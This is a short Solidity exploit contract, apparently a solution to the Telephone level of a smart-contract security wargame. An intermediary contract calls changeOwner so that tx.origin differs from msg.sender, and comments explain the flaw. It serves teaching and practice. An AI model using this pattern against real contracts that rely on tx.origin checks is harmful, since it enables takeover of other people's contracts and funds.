pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attacker {
    
    function hack(address instance) public {
        //The attack consists in calling the changeOwner function from the Telephone contract, in order to change the owner of the contract to the attacker.
        //This is possible because the changeOwner function is not checking if the caller is the owner of the contract, but if the transaction origin the same as the msg sender.
        //By sending it from a contract the tx.origin will be the EOA address of the attacker, but the msg.sender will be the attacker contract address.
       Telephone(instance).changeOwner(msg.sender);
    }
}